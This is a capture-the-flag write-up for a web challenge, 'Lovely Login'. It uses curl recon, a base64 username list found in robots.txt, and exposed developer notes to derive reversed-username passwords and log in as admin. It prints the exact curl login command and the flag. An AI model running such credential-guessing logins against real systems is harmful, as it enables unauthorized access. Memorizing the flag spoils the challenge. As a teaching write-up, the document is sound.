# Lovely Login

**Category:** Web    
**Flag:** `bronco{R3v3rs1ng_1s_S3cure}`  

> Welcome to our lovely new login page 💕. The developers swear it's secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user?

---

## Table of Contents

1. [Summary](#summary)
2. [Tools Used](#tools-used)
3. [Reconnaissance](#reconnaissance)
   - [Initial page fetch](#initial-page-fetch)
   - [robots.txt — base64 usernames](#robotstxt--base64-usernames)
   - [/security — developer notes](#security--developer-notes)
4. [Exploitation](#exploitation)
   - [Reverse the password logic](#reverse-the-password-logic)
   - [Login via JSON POST](#login-via-json-post)
5. [Flag](#flag)
6. [Key Takeaways](#key-takeaways)

---

## Summary

The challenge presents a login page that uses a JSON API for authentication. The developers left two critical artifacts exposed: a `robots.txt` file with a base64-encoded list of usernames, and an internal `/security` notes page that describes how passwords are generated. The password scheme is trivial — each username's password is simply the username spelled backwards. Logging in as `admin` / `nimda` retrieves the flag.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | HTTP requests, header inspection, form submission |
| `base64` | Decode the username list |
| `less` / browser | Inspect page source |
| `mitmproxy` (optional) | Intercept traffic (if preferred over curl) |

No heavy tooling needed — no Burp Suite macros, no `sqlmap`, no `ffuf`. Straightforward recon is enough.

---

## Reconnaissance

### Initial page fetch

```bash
curl -v https://broncoctf-lovely-login.chals.io/
```

The response shows a `X-Powered-By: Express` header (Node.js/Express backend) and a simple login form. The HTML source reveals the form submits JSON to `/login`:

```javascript
async function login() {
  const u = document.getElementById("u").value;
  const p = document.getElementById("p").value;

  const res = await fetch("/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({username: u, password: p})
  });

  document.getElementById("out").innerHTML = await res.text();
}
```

---

### robots.txt — base64 usernames

```bash
curl https://broncoctf-lovely-login.chals.io/robots.txt
```

```
User-agent: *
Disallow: /security

# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

A `Disallow: /security` entry hints at a hidden page, and the base64 comment catches the eye. Removing the space and decoding:

```bash
echo "amVmZixzYXJhaCxhZG1pbixndWVzdA==" | base64 -d
```

```
jeff,sarah,admin,guest
```

Four usernames: `jeff`, `sarah`, `admin`, `guest`.

---

### /security — developer notes

```bash
curl https://broncoctf-lovely-login.chals.io/security
```

The page is titled **"Internal Security Notes"** with status "Work in progress". It contains three bullet points:

| Note | Implication |
|------|-------------|
| Passwords are derived from usernames | The password is a transformation of the username, not random |
| Current implementation stores them backwards for obfuscation | The transformation is a **string reversal** |
| Planned upgrade: hashing + salting | Confirms the current scheme is intentionally weak |

And the fourth line is the punchline: **"TODO: remove this page before production deployment!"** — classic CTF developer oversight.

---

## Exploitation

### Reverse the password logic

From the security notes, each password is simply the username reversed:

| Username | Reversed = Password |
|----------|-------------------|
| `jeff` | `ffej` |
| `sarah` | `haras` |
| `admin` | `nimda` |
| `guest` | `tseug` |

### Login via JSON POST

The login endpoint expects `Content-Type: application/json` (not form-encoded). Use `curl` with the correct content type:

```bash
curl -s -X POST https://broncoctf-lovely-login.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"nimda"}'
```

Response:

```html
<h2>Welcome, admin.</h2>
<img src="https://media.giphy.com/media/.../giphy.gif">
<pre>bronco{R3v3rs1ng_1s_S3cure}</pre>
```

---

## Flag

```
bronco{R3v3rs1ng_1s_S3cure}
```

The flag name itself is a self-aware joke: *"Reversing is Secure"* — poking fun at the idea that reversing a string counts as real security.

---

## Key Takeaways

1. **Never leave internal / admin pages exposed in production.** The `/security` page was the entire solution to the challenge.
2. **`robots.txt` can leak more than just crawl directives.** A base64-encoded comment gave away the usernames.
3. **Check Content-Type expectations.** The frontend sent JSON but many testers might try form-encoded first — sending the wrong Content-Type results in a 500 error.
4. **Simple bugs beat complex exploits.** The "password obfuscation" was a single string reversal. Always try the simplest explanation first before reaching for heavy tooling.
5. **Base64 is not encryption.** It's encoding. Any string that looks like base64 in a CTF context should be decoded immediately.

---


